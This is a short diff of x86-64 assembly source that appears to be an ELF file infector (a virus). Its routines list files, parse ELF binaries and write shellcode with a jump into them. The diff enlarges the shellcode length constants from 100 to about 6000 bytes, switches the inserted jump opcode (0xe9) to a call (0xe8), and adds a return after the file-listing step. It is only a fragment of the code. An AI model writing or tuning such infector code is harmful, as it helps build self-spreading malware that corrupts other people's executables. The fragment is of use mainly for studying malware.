@@ -50,7 +50,7 @@ _start:
 	lea rdi, [rsp]
 	call list_files
 	add rsp, 8
-
+retn
 exit_prog:
 	mov	rax, 0x3c;
 	mov rdi, 1
@@ -817,9 +817,9 @@ push rdx
 	pop rcx
 retn
 
-%define SHELLCODE_LEN 100 ; 44 + 5 (jmp) + 12 (exit) + signature (39)
-%define SHELLCODE_JMP_INDEX 49 ; 44 + 5 (jmp)
-%define PURE_SHELLCODE_LEN 44 
+%define SHELLCODE_LEN 6062 ; 44 + 5 (jmp) + 12 (exit) + signature (39)
+%define SHELLCODE_JMP_INDEX 6011 ; 44 + 5 (jmp)
+%define PURE_SHELLCODE_LEN 6006 
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse64elf:
 	sub rsp, 8
@@ -1643,7 +1643,7 @@ write_jmp_shellcode:
 	sub rsp, 4; rel_jmp
 
 	push rsi
-	push 0x000000e9
+	push 0x000000e8
 	mov rax, 1
 	mov rsi, rsp
 	mov rdx, 1
